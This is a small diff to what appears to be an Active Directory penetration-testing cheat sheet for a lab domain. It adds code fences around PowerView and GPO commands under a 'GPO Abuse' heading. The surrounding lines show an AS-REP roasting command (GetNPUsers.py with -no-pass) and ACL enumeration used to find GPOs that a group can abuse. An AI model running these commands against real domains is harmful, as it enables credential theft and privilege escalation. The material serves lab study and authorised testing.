@@ -362,8 +362,13 @@ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_a
 ```
 
 **GPO Abuse**
+ ```
  Get-DomainGPO |select displayname
+ ```
+ ```
  Get-GPO -All | Select DisplayName
+ ```
+ 
  ```
  $sid=Convert-NameToSid "Group of Interest"
  Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
